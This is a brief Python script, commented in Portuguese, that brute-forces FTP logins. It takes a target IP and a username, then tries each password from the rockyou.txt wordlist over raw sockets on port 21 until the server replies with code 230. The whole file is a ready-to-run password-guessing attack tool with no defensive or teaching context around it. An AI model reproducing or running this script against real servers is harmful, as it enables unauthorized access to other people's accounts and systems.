#!/usr/bin/python
import socket,sys,re

if len(sys.argv) !=3:
	print("Modo de uso: python brutfpt.py IP usuario")
	sys.exit()
alvo = sys.argv[1]
usuario = sys.argv[2]

f = open ('/usr/share/wordlists/rockyou.txt')
for palavra in f.readlines():
	print("Realizando bruteforce FTP: %s:%s"%(usuario,palavra))
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((alvo,21))
	s.recv(1024)
	s.send("USER "+usuario+"\r\n")
	s.recv(1024)
	s.send("PASS "+palavra+"\r\n")
	resposta = s.recv(1024)
	s.send("QUIT\r\n")
	if re.search('230', resposta):
		print("[+] Senha encontrada --->", palavra)
		break
